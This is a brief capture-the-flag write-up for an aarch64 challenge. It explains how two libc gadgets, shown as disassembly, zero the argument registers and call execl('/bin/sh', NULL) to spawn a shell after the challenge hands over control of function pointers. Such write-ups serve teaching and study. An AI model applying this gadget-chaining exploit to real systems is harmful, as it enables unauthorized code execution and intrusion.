# Tooooo - Misc

We are given an aarch64 binary which prints the `stdout` address and gives control on two function pointers after clobbering the stack and all registers except for `x25` and `x26` (overwrites everything with `/dev/urandom` data).

We initially listed a bunch of gadgets along with their constraints that if satisfied, would give us the shell. Once we had all the constraints, we manually reached for different gadgets in libc which when executed would lead us to the state that satisfies the constraints. Following are the two gadgets that we used:

```assembly
.text:0000000000110700                 MOV             X4, #0
.text:0000000000110704                 MOV             X3, #0
.text:0000000000110708                 BFXIL           X3, X4, #0, #0x30 ; '0'
.text:000000000011070C                 MOV             W1, #0
.text:0000000000110710                 MOV             X2, #0
.text:0000000000110714                 FMOV            D0, X2
.text:0000000000110718                 BFI             X3, X1, #0x30, #0xF ; '0'
.text:000000000011071C                 MOV             W0, #0
.text:0000000000110720                 BFI             X3, X0, #0x3F, #1 ; '?'
.text:0000000000110724                 FMOV            V0.D[1], X3
.text:0000000000110728                 RET
```

followed by:

```assembly
.text:0000000000063E90                 ADRP            X0, #aBinSh@PAGE ; "/bin/sh"
.text:0000000000063E94                 ADD             X0, X0, #aBinSh@PAGEOFF ; "/bin/sh"
.text:0000000000063E98                 BL              execl
```

to set `x1` and `x2` to 0 and call `execl("/bin/sh", NULL);`

**~** Jenish Rakholiya